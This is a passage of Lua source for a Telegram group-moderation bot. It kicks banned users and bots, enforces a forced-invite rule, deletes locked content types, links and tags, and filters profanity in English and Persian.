<b>Username :</b> ]] .. ("@" .. msg.from.username or "<code>No Username</code>") .. "\n<code>\216\180\217\133\216\167 \216\167\216\172\216\167\216\178\217\135 \216\175\216\179\216\170\216\177\216\179\219\140 \216\168\217\135 \216\179\217\134\216\172\216\167\217\130 \217\190\219\140\216\167\217\133 \216\177\216\167 \217\134\216\175\216\167\216\177\219\140\216\175\216\140 \216\168\217\135 \217\135\217\133\219\140\217\134 \216\175\217\132\219\140\217\132 \217\190\219\140\216\167\217\133 \217\130\216\168\217\132\219\140 \217\133\216\172\216\175\216\175 \216\179\217\134\216\172\216\167\217\130 \217\133\219\140\218\175\216\177\216\175\216\175</code>", 0, "html")
        elseif not lang then
          tdcli.sendMessage(msg.chat_id_, msg.id, 0, "<b>User ID :</b> <code>" .. msg.from.id .. [[
</code>
<b>Username :</b> ]] .. ("@" .. msg.from.username or "<code>No Username</code>") .. [[

<code>You Have Not Permission To Pin Message, Last Message Has Been Pinned Again</code>]], 0, "html")
        end
      end
      if not is_mod(msg) and not redis:sismember("AllowUserFrom~" .. chat, user) then
        function check_newmember(arg, data)
          if data.type_.ID == "UserTypeBot" and lock_bots == "yes" then
            kick_user(data.id_, arg.chat_id)
          end
          if is_banall(data.id_) or is_banall(data.username_) then
            kick_user(data.id_, arg.chat_id)
            if not lang then
              tdcli.sendMessage(arg.chat_id, 0, 1, "`This User is Globally Banned!`", 1, "md")
            else
              tdcli.sendMessage(arg.chat_id, 0, 1, "`\216\167\219\140\217\134 \218\169\216\167\216\177\216\168\216\177 \216\167\216\178 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167 \217\133\216\173\216\177\217\136\217\133 \216\167\216\179\216\170!`", 1, "md")
            end
          end
          if lock_join == "yes" and arg.tester == false then
            kick_user(data.id_, arg.chat_id)
          end
          if lock_forcedinvite == "yes" and data.type_.ID ~= "UserTypeBot" then
            if arg.tester == true and redis:get("CurrentInvite:" .. arg.chat_id .. ":" .. msg.from.id) ~= "ok" then
              CurrentInvite = redis:get("CurrentInvite:" .. arg.chat_id .. ":" .. msg.from.id) or 0
              if tonumber(CurrentInvite) + tonumber(arg.nums) >= tonumber(ForcedInvite) then
                redis:set("CurrentInvite:" .. arg.chat_id .. ":" .. msg.from.id, "ok")
                if not lang then
                  tdcli.sendMention(arg.chat_id, 0, msg.from.first_name .. " (" .. msg.from.id .. [[
) Thanks
You Have invited ]] .. ForcedInvite .. " Members For Group And You Can Send Message Now", 0, tonumber(Slen(msg.from.first_name)), msg.from.id)
                else
                  tdcli.sendMention(arg.chat_id, 0, msg.from.first_name .. " (" .. msg.from.id .. ") \217\133\216\170\216\180\218\169\216\177\217\133\n\216\180\217\133\216\167 " .. ForcedInvite .. " \216\185\216\182\217\136 \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135 \216\175\216\185\217\136\216\170 \218\169\216\177\216\175\219\140\216\175 \217\136 \216\167\217\132\216\167\217\134 \217\133\219\140\216\170\217\136\217\134\219\140\216\175 \217\190\219\140\216\167\217\133 \216\167\216\177\216\179\216\167\217\132 \218\169\217\134\219\140\216\175", 0, tonumber(Slen(msg.from.first_name)), msg.from.id)
                end
              elseif tonumber(CurrentInvite) + tonumber(arg.nums) < tonumber(ForcedInvite) then
                redis:set("CurrentInvite:" .. arg.chat_id .. ":" .. msg.from.id, tonumber(CurrentInvite) + tonumber(arg.nums))
                if not lang then
                  tdcli.sendMention(arg.chat_id, 0, msg.from.first_name .. " (" .. msg.from.id .. [[
)
Number of Invited Members By You: ]] .. tonumber(CurrentInvite) + tonumber(arg.nums) .. [[

You Must invite ]] .. ForcedInvite - (tonumber(CurrentInvite) + tonumber(arg.nums)) .. " other Member", 0, tonumber(Slen(msg.from.first_name)), msg.from.id)
                else
                  tdcli.sendMention(arg.chat_id, 0, msg.from.first_name .. " (" .. msg.from.id .. ")\n\216\170\216\185\216\175\216\167\216\175 \216\167\216\185\216\182\216\167 \216\175\216\185\217\136\216\170 \216\180\216\175\217\135 \216\170\217\136\216\179\216\183 \216\180\217\133\216\167: " .. tonumber(CurrentInvite) + tonumber(arg.nums) .. "\n\216\180\217\133\216\167 \216\168\216\167\219\140\216\175 " .. ForcedInvite - (tonumber(CurrentInvite) + tonumber(arg.nums)) .. " \216\185\216\182\217\136 \216\175\219\140\218\175\216\177 \216\175\216\185\217\136\216\170 \218\169\217\134\219\140\216\175", 0, tonumber(Slen(msg.from.first_name)), msg.from.id)
                end
              end
            elseif arg.tester == false and redis:get("CurrentInvite:" .. arg.chat_id .. ":" .. data.id_) ~= "ok" then
              redis:del("CurrentInvite:" .. arg.chat_id .. ":" .. data.id_)
              if not lang then
                tdcli.sendMention(arg.chat_id, 0, data.first_name_ .. " (" .. data.id_ .. [[
) Welcome
This Group is Locked And You Can Not Send Message!
You Must invite ]] .. ForcedInvite .. " Member", 0, tonumber(Slen(data.first_name_)), data.id_)
              else
                tdcli.sendMention(arg.chat_id, 0, data.first_name_ .. " (" .. data.id_ .. ") \216\174\217\136\216\180 \216\162\217\133\216\175\219\140\216\175\n\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \217\130\217\129\217\132 \217\133\219\140 \216\168\216\167\216\180\216\175 \217\136 \216\180\217\133\216\167 \217\134\217\133\219\140 \216\170\217\136\216\167\217\134\219\140\216\175 \217\190\219\140\216\167\217\133 \216\167\216\177\216\179\216\167\217\132 \218\169\217\134\219\140\216\175!\n\216\180\217\133\216\167 \216\168\216\167\219\140\216\175 " .. ForcedInvite .. " \216\185\216\182\217\136 \216\175\216\185\217\136\216\170 \218\169\217\134\219\140\216\175", 0, tonumber(Slen(data.first_name_)), data.id_)
              end
            end
          end
        end
        if msg.adduser then
          nums = 0
          for i = 0, #msg.content_.members_ do
            nums = tonumber(nums) + 1
          end
          tdcli_function({
            ID = "GetUser",
            user_id_ = msg.adduser
          }, check_newmember, {
            chat_id = chat,
            msg_id = msg.id,
            user_id = user,
            msg = msg,
            nums = nums,
            tester = true
          })
        end
        if msg.content_.ID == "MessageChatJoinByLink" then
          tdcli_function({
            ID = "GetUser",
            user_id_ = msg.sender_user_id_
          }, check_newmember, {
            chat_id = chat,
            msg_id = msg.id,
            user_id = user,
            msg = msg,
            tester = false
          })
        end
        if not TgServiceMsg and lock_forcedinvite == "yes" and redis:get("CurrentInvite:" .. chat .. ":" .. user) ~= "ok" then
          del_msg(chat, tonumber(msg.id))
          if not redis:get("NoteForcedInvite:" .. msg.to.id .. ":" .. msg.from.id) then
            CurrentInvite = redis:get("CurrentInvite:" .. msg.to.id .. ":" .. msg.from.id) or 0
            inFinish = ForcedInvite - tonumber(CurrentInvite)
            if CurrentInvite ~= "ok" and 1 <= inFinish then
              T_ = redis:get("EditBot:timeinviter") or 1
              T = tonumber(T_) * 60
              redis:setex("NoteForcedInvite:" .. msg.to.id .. ":" .. msg.from.id, T, true)
              if not lang then
                tdcli.sendMention(msg.to.id, 0, msg.from.first_name .. " (" .. user .. [[
)
Number of Invited Members By You: ]] .. CurrentInvite .. [[

You Must invite ]] .. inFinish .. " other Member For Send Message", 0, tonumber(Slen(msg.from.first_name)), user)
              else
                tdcli.sendMention(msg.to.id, 0, msg.from.first_name .. " (" .. user .. ")\n\216\170\216\185\216\175\216\167\216\175 \216\167\216\185\216\182\216\167 \216\175\216\185\217\136\216\170 \216\180\216\175\217\135 \216\170\217\136\216\179\216\183 \216\180\217\133\216\167: " .. CurrentInvite .. "\n\216\180\217\133\216\167 \216\168\216\167\219\140\216\175 " .. inFinish .. " \216\185\216\182\217\136 \216\175\219\140\218\175\216\177 \216\168\216\177\216\167\219\140 \218\134\216\170 \218\169\216\177\216\175\217\134 \216\175\216\185\217\136\216\170 \218\169\217\134\219\140\216\175", 0, tonumber(Slen(msg.from.first_name)), user)
              end
            end
          end
          function getBot(arg, data)
            for k, v in pairs(data.messages_) do
              if v.sender_user_id_ == bot.id or v.can_be_edited_ then
                del_msg(v.chat_id_, v.id_)
              end
            end
          end
          tdcli_function({
            ID = "GetChatHistory",
            chat_id_ = chat,
            from_message_id_ = msg.id_,
            offset_ = 0,
            limit_ = 100
          }, getBot, nil)
        end
        if is_banall(msg.from.id) then
          kick_user(msg.from.id, msg.chat_id_)
          if not lang then
            tdcli.sendMessage(msg.chat_id_, 0, 1, "`This User is Globally Banned!`", 1, "md")
          else
            tdcli.sendMessage(msg.chat_id_, 0, 1, "`\216\167\219\140\217\134 \218\169\216\167\216\177\216\168\216\177 \216\167\216\178 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167 \217\133\216\173\216\177\217\136\217\133 \216\167\216\179\216\170!`", 1, "md")
          end
        end
        if msg.text and lock_fohsh == "yes" then
          local BadWords = msg.text:match("[Hh][Aa][Rr][Oo][Mm][Ii]") or msg.text:match("[Hh][Aa][Rr][Oo][Mm][Zz][Aa]Dd][Ee]") or msg.text:match("[Nn][Aa][Nn][Ee][Kk][Hh][Aa][Rr][Bb]") or msg.text:match("[Ff][Uu][Cc][Kk][Yy][Oo][Uu]") or msg.text:match("[Dd][Aa]Uu][Ss]") or msg.text:match("[Bb][Ee][Gg][Aa]") or msg.text:match("[Ss][Pp][Aa][Mm]") or msg.text:match("[Bb][Ss][Ii][Kk]") or msg.text:match("[Ss][Ii][Kk]") or msg.text:match("[Ss][Ii][Kk][Tt][Ii][Rr]") or msg.text:match("[Nn][Aa][Nn][Ee][Kk][Ii][Rr][Dd][Oo][Zz][Ee][Dd]") or msg.text:match("[Kk][Oo]Ss][Ll][Ii][Ss]") or msg.text:match("[Nn][Aa][Nn][Ee][Zz][Ee][Nn][Aa]") or msg.text:match("[Kk][Oo][Nn][Dd][Ee]") or msg.text:match("[Kk][Oo][Ss] [Kk][Ee][Ss][Ee]") or msg.text:match("[Jj][Ee][Nn][Dd][Ee]") or msg.text:match("[Mm][Aa][Dd][Aa][Rr] [Jj][Ee][Nn][Dd][Ee][Hh]") or msg.text:match("[Kk][Ii][Rr][Aa][Mm] [Dd][Aa][Hh][Aa][Nn]Ee][Tt][Oo][Nn]") or msg.text:match("[Dd][Oo][Dd][Oo][Ll]") or msg.text:match("[Ss][Hh][Oo][Mm][Bb][Oo][Ll]") or msg.text:match("[Cc][Oo][Ss][Ii]") or msg.text:match("[Nn][Aa][Nn][Ee] [Cc][Oo][Ss]") or msg.text:match("[Cc][Oo][Ss] [Mm][Ee][Mm][Bb][Ee][Rr]") or msg.text:match("[Zz][Aa][Nn][Aa] [Zz][Aa][Dd][Ee]") or msg.text:match("[Nn][Aa][Nn][Ee] [Oo][Bb][Ii]") or msg.text:match("[Kk][Ii][Rr][Ii]") or msg.text:match("[Kk][Nn][Oo][Nn][Ii]") or msg.text:match("[Nn][Aa][Gg][Ii][Dd][Aa][Mm]") or msg.text:match("[Gg][Aa][Ii][Dd][Aa][Mm]") or msg.text:match("[Kk][Oo][Ss] [Ll][Ii][Ss]") or msg.text:match("[Kk][Oo][Ss] [Mm][Oo][Kk][Hh]") or msg.text:match("[Kk][Oo][Ss] [Mm][Aa][Gg][Zz]") or msg.text:match("[Kk][Oo][Ss] [Kk][Hh][Oo][Ll]") or msg.text:match("[Jj][Aa][Gg][Ii]") or msg.text:match("[Jj][Aa][Gg]") or msg.text:match("[Kk][Hh][Aa][Rr] [Kk][Oo][Ss][Ee]") or msg.text:match("[Kk][Hh][Aa][Rr] [Kk][Oo][Ss][Dd][Ee]") or msg.text:match("[Cc][Oo][Cc][Hh][Oo][Ll]") or msg.text:match("[Ff][Uu][Cc][Kk]") or msg.text:match("[Mm][Aa][Dd][Aa][Rr] [Bb][Ee] [Kk][Aa][Tt][Aa]") or msg.text:match("[Hh][Rr][Oo][Mm] [Zz][Aa][Dd][Ee]") or msg.text:match("[Bb][Ii] [Gg][Ee][Rr][Aa][Tt]") or msg.text:match("[Gg][Aa][Ii][Dd][Ii][Nn]") or msg.text:match("[Kk][Oo][Ss][Nn][Aa][Nn][Tt]") or msg.text:match("[Kk][Oo][Nn][Ii]") or msg.text:match("[Kk][Ii][Rr][Ii]") or msg.text:match("[Kk][Ii][Rr]") or msg.text:match("[Jj][Ee][Nn][Dd][Ee]") or msg.text:match("[Kk][Hh][Aa][Rr]") or msg.text:match("[Kk][Oo][Ss][Ii]") or msg.text:match("\218\169\217\136\217\134\219\140") or msg.text:match("\218\169\219\140\216\177\219\140") or msg.text:match("\218\169\216\181 \217\132\219\140\216\179") or msg.text:match("\218\169\216\179\218\169\216\180") or msg.text:match("\218\169\216\179 \218\169\216\180") or msg.text:match("\218\169\217\136\217\134\216\175\217\135") or msg.text:match("\216\172\217\134\216\175\217\135") or msg.text:match("\218\169\216\179 \217\134\217\134\217\135") or msg.text:match("\218\175\216\167\219\140\219\140\216\175\217\133") or msg.text:match("\217\134\218\175\216\167\219\140\219\140\216\175\217\133") or msg.text:match("\216\168\218\175\216\167") or msg.text:match("\218\175\216\167\219\140\219\140\216\175\217\134") or msg.text:match("\216\175\219\140\217\136\216\171") or msg.text:match("\217\134\217\134\217\135 \216\167\217\132\218\169\216\179\219\140\216\179") or msg.text:match("\217\134\217\134\217\135 \216\178\217\134\216\167") or msg.text:match("\217\134\217\134\217\135 \218\169\219\140\216\177 \216\175\216\178\216\175") or msg.text:match("\216\178\217\134\216\167\216\178\216\167\216\175\217\135") or msg.text:match("\217\133\216\167\216\175\216\177 \216\168\217\135 \216\174\216\183\216\167") or msg.text:match("\218\169\216\179\217\133\216\174") or msg.text:match("\218\169\216\179\216\174\217\132") or msg.text:match("\218\169\216\179\217\133\216\186\216\178") or msg.text:match("\217\134\217\134\217\135 \216\174\216\177\216\167\216\168") or msg.text:match("\218\169\219\140\216\177\217\133 \216\175\217\135\217\134\216\170") or msg.text:match("\218\169\219\140\216\177\217\133 \216\175\217\135\217\134\216\170\217\136\217\134") or msg.text:match("\216\173\216\177\217\136\217\133 \216\178\216\167\216\175\217\135") or msg.text:match("\217\129\216\167\218\169") or msg.text:match("\217\129\216\167\218\169 \219\140\217\136") or msg.text:match("\217\130\216\177\217\136\217\133\216\181\216\167\217\130") or msg.text:match("\216\168\219\140 \216\186\219\140\216\177\216\170") or msg.text:match("\218\169\216\179 \217\134\217\134\216\170") or msg.text:match("\216\172\217\130") or msg.text:match("\216\172\217\130\219\140") or msg.text:match("\216\172\217\130 \216\178\217\134") or msg.text:match("\216\180\217\136\217\133\216\168\217\136\217\132") or msg.text:match("\218\134\217\136\218\134\217\136\217\132") or msg.text:match("\218\134\217\136\218\134\217\136\217\132\217\135") or msg.text:match("\216\175\217\136\216\175\217\136\217\132") or msg.text:match("\217\134\217\134\217\135 \218\134\216\179") or msg.text:match("\218\134\216\179\219\140") or msg.text:match("\218\134\216\179 \217\133\217\133\216\168\216\177") or msg.text:match("\216\167\217\136\216\168\219\140") or msg.text:match("\217\130\216\173\216\168\217\135") or msg.text:match("\216\168\216\179\219\140\218\169") or msg.text:match("\216\179\219\140\218\169\216\170\216\177") or msg.text:match("\216\179\219\140\218\169") or msg.text:match("\216\174\217\136\216\167\216\177\218\169\216\179\216\170\217\135") or msg.text:match("\216\174\217\136\216\167\216\177\218\169\216\179\216\175\217\135") or msg.text:match("\216\185\217\136\216\182\219\140") or msg.text:match("\218\169\219\140\216\177") or msg.text:match("[Kk][Ii][Rr]") or msg.text:match("\218\169\216\181")
          if BadWords then
            del_msg(chat, tonumber(msg.id))
          end
        end
        if msg.text then
          Filters = redis:smembers("GroupFilterList:" .. msg.chat_id_)
          for k, v in pairs(Filters) do
            if string.find(string.lower(msg.text), string.lower(v)) then
              del_msg(chat, tonumber(msg.id))
            end
          end
        end
        if msg.content_.ID == "MessageUnsupported" and lock_note == "yes" then
          del_msg(chat, tonumber(msg.id))
        end
        if msg.edited and lock_edit == "yes" then
          del_msg(chat, tonumber(msg.id))
          if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
            SenseGiveWarn(msg, "edit IS Locked!")
          end
          if 0 > redis:ttl("CheckThisMsg" .. user) then
            redis:setex("CheckThisMsg" .. user, 60, true)
          end
        end
        if msg.forward_info_ then
          redis:incr("getForwardMessages:" .. user .. ":" .. chat)
        end
        if msg.forward_info_ and mute_forward == "yes" then
          LockName = "forward"
          del_msg(chat, tonumber(msg.id))
          if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
            SenseGiveWarn(msg, "forward IS Locked!")
          end
          if 0 > redis:ttl("CheckThisMsg" .. user) then
            redis:setex("CheckThisMsg" .. user, 60, true)
          end
          if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
            CheckExpireLockDaily(msg, LockName, "m")
          end
        elseif msg.content_.ID == "MessageForwardedFromUser" and mute_forward == "no" and sense then
          CheckLockDaily(msg, "forward", "m")
        end
        if msg.content_.ID == "MessagePhoto" then
          if mute_photo == "yes" then
            LockName = "photo"
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "photo IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "m")
            end
          elseif mute_photo == "no" and sense then
            CheckLockDaily(msg, "photo", "m")
          end
        end
        if msg.content_.ID == "MessageVideo" then
          if mute_video == "yes" then
            LockName = "video"
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "video IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "m")
            end
          elseif mute_video == "no" and sense then
            CheckLockDaily(msg, "video", "m")
          end
        end
        if msg.content_.ID == "MessageDocument" and mute_document == "yes" then
          LockName = "document"
          if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
            SenseGiveWarn(msg, "document IS Locked!")
          end
          if 0 > redis:ttl("CheckThisMsg" .. user) then
            redis:setex("CheckThisMsg" .. user, 60, true)
          end
          if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
            CheckExpireLockDaily(msg, LockName, "m")
          end
        elseif msg.content_.ID == "MessageDocument" and mute_document == "no" and sense then
          CheckLockDaily(msg, "document", "m")
        end
        if msg.content_.ID == "MessageSticker" then
          if mute_sticker == "yes" then
            LockName = "sticker"
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "sticker IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "m")
            end
          elseif mute_sticker == "no" and sense then
            CheckLockDaily(msg, "sticker", "m")
          end
        end
        if msg.content_.ID == "MessageAnimation" then
          if mute_gif == "yes" then
            LockName = "gif"
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "gif IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "m")
            end
          elseif mute_gif == "no" and sense then
            CheckLockDaily(msg, "gif", "m")
          end
        end
        if msg.content_.ID == "MessageContact" and mute_contact == "yes" then
          LockName = "contact"
          if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
            SenseGiveWarn(msg, "contact IS Locked!")
          end
          if 0 > redis:ttl("CheckThisMsg" .. user) then
            redis:setex("CheckThisMsg" .. user, 60, true)
          end
          if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
            CheckExpireLockDaily(msg, LockName, "m")
          end
        elseif msg.content_.ID == "MessageContact" and mute_contact == "no" and sense then
          CheckLockDaily(msg, "contact", "m")
        end
        if msg.content_.ID == "MessageLocation" and mute_location == "yes" then
          LockName = "location"
          if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
            SenseGiveWarn(msg, "location IS Locked!")
          end
          if 0 > redis:ttl("CheckThisMsg" .. user) then
            redis:setex("CheckThisMsg" .. user, 60, true)
          end
          if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
            CheckExpireLockDaily(msg, LockName, "m")
          end
        elseif msg.content_.ID == "MessageLocation" and mute_location == "no" and sense then
          CheckLockDaily(msg, "location", "m")
        end
        if msg.content_.ID == "MessageVoice" then
          if mute_voice == "yes" then
            LockName = "voice"
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "voice IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "m")
            end
          elseif mute_voice == "no" and sense then
            CheckLockDaily(msg, "voice", "m")
          end
        end
        if msg.content_ and mute_keyboard == "yes" then
          LockName = "keyboard"
          if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
            del_msg(chat, tonumber(msg.id))
          end
          if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
            SenseGiveWarn(msg, "keyboard IS Locked!")
          end
          if 0 > redis:ttl("CheckThisMsg" .. user) then
            redis:setex("CheckThisMsg" .. user, 60, true)
          end
          if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
            CheckExpireLockDaily(msg, LockName, "m")
          end
        elseif msg.content_.ID == "MessageContact" and mute_keyboard == "no" and sense then
          CheckLockDaily(msg, "keyboard", "m")
        end
        if tonumber(msg.via_bot_user_id_) ~= 0 and mute_inline == "yes" then
          LockName = "inline"
          del_msg(chat, tonumber(msg.id))
          if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
            SenseGiveWarn(msg, "inline IS Locked!")
          end
          if 0 > redis:ttl("CheckThisMsg" .. user) then
            redis:setex("CheckThisMsg" .. user, 60, true)
          end
          if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
            CheckExpireLockDaily(msg, LockName, "m")
          end
        elseif tonumber(msg.via_bot_user_id_) ~= 0 and mute_inline == "no" and sense then
          CheckLockDaily(msg, "inline", "m")
        end
        if msg.content_.ID == "MessageGame" and mute_game == "yes" then
          LockName = "game"
          if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
            SenseGiveWarn(msg, "game IS Locked!")
          end
          if 0 > redis:ttl("CheckThisMsg" .. user) then
            redis:setex("CheckThisMsg" .. user, 60, true)
          end
          if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
            CheckExpireLockDaily(msg, LockName, "m")
          end
        elseif msg.content_.ID == "MessageGame" and mute_game == "no" and sense then
          CheckLockDaily(msg, "game", "m")
        end
        if msg.content_.ID == "MessageAudio" then
          if mute_audio == "yes" then
            LockName = "audio"
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "audio IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "m")
            end
          elseif mute_audio == "no" and sense then
            CheckLockDaily(msg, "audio", "m")
          end
        end
        if not msg.text and not msg.media.caption and not TgServiceMsg and lock_withcaption == "yes" then
          del_msg(chat, tonumber(msg.id))
        end
        if msg.media.caption then
          if lock_nocaption == "yes" then
            del_msg(chat, tonumber(msg.id))
          end
          local link_caption = msg.media.caption:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.media.caption:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.media.caption:match("[Tt].[Mm][Ee]/") or msg.media.caption:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/")
          if link_caption then
            redis:incr("getLinkMessages:" .. user .. ":" .. chat)
          end
          if link_caption and lock_link == "yes" then
            LockName = "link"
            del_msg(chat, tonumber(msg.id))
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "link IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "l")
            end
          elseif link_caption and lock_link == "no" and sense then
            CheckLockDaily(msg, "link", "l")
          end
          local usrn_caption = msg.media.caption:match("@")
          if usrn_caption and lock_username == "yes" then
            del_msg(chat, tonumber(msg.id))
          end
          local tag_caption = msg.media.caption:match("#")
          if tag_caption and lock_tag == "yes" then
            LockName = "tag"
            del_msg(chat, tonumber(msg.id))
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "tag IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "l")
            end
          elseif tag_caption and lock_tag == "no" and sense then
            CheckLockDaily(msg, "tag", "l")
          end
          if redis:sismember("GroupFilterList:" .. msg.to.id, msg.media.caption) then
            del_msg(chat, tonumber(msg.id))
          end
          local arabic_caption = msg.media.caption:match("[\216-\219][\128-\191]")
          if arabic_caption and lock_arabic == "yes" then
            del_msg(chat, tonumber(msg.id))
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "arabic IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
          end
          local eng_caption = msg.media.caption:match("[AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz]")
          if eng_caption and lock_english == "yes" then
            del_msg(chat, tonumber(msg.id))
          end
        end
        if msg.text then
          if lock_spam == "yes" then
            local _nl, ctrl_chars = string.gsub(msg.text, "%c", "")
            local _nl, real_digits = string.gsub(msg.text, "%d", "")
            if string.len(msg.text) > 2049 or ctrl_chars > 40 or real_digits > 2000 then
              del_msg(chat, tonumber(msg.id))
            end
          end
          local link_msg = msg.text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.text:match("[Tt].[Mm][Ee]/") or msg.text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/")
          if link_msg then
            redis:incr("getLinkMessages:" .. user .. ":" .. chat)
          else
            redis:incr("getTextMessages:" .. user .. ":" .. chat)
          end
          if link_msg and lock_link == "yes" then
            LockName = "link"
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "link IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "l")
            end
          elseif link_msg and lock_link == "no" and sense then
            CheckLockDaily(msg, "link", "l")
          end
          local usrn_msg = msg.text:match("@")
          if usrn_msg and lock_username == "yes" and not redis:get("Allow~" .. msg.text .. "From~" .. msg.chat_id_) then
            del_msg(chat, tonumber(msg.id))
          end
          local tag_msg = msg.text:match("#")
          if tag_msg and lock_tag == "yes" and not redis:get("Allow~" .. msg.text .. "From~" .. msg.chat_id_) then
            LockName = "tag"
            del_msg(chat, tonumber(msg.id))
            if sense and 0 < redis:ttl("CheckThisMsg" .. user) then
              SenseGiveWarn(msg, "tag IS Locked!")
            end
            if 0 > redis:ttl("CheckThisMsg" .. user) then
              redis:setex("CheckThisMsg" .. user, 60, true)
            end
            if 0 > redis:ttl("CheckDailyExpire" .. LockName .. ":GP:" .. chat) and 0 < redis:ttl("CheckDaily" .. LockName .. ":GP:" .. chat) then
              CheckExpireLockDaily(msg, LockName, "l")
            end
          elseif tag_msg and lock_tag == "no" and sense then
            CheckLockDaily(msg, "tag", "l")
          end
